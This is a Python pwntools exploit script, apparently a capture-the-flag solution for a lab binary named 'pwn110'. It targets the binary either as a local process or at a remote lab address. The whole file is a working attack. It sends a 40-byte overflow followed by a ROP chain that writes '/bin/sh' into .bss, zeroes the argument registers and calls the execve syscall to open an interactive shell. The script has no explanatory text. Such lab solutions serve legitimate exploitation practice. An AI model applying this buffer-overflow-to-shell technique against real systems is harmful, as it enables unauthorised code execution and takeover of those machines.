#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF("./pwn110", checksec=False)

if args.REMOTE:
    p = remote("10.10.236.131", 9010)
else:
    p = process(binary.path)

rop = ROP(binary)
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
mov_rdi_rdx = 0x4340a3                              # mov qword ptr[rdi], rdx; ret;
syscall = rop.find_gadget(["syscall", "ret"])[0]

payload = b""
payload += 40 * b"A"

# write filename (-> /bin/sh) to .bss
payload += p64(pop_rdi)                             # pop rdi <- .bss
payload += p64(binary.bss())
payload += p64(pop_rdx)                             # pop rdx <- /bin/sh
payload += b"/bin/sh\x00"
payload += p64(mov_rdi_rdx)                         # mov qword ptr[rdi], rdx

payload += p64(pop_rsi)                             # rsi = 0
payload += p64(0)
payload += p64(pop_rdx)                             # rdx = 0
payload += p64(0)
payload += p64(pop_rax)                             # rax = 59 (execve)
payload += p64(59) 
payload += p64(syscall)                             # syscall     

p.sendline(payload)

p.interactive()
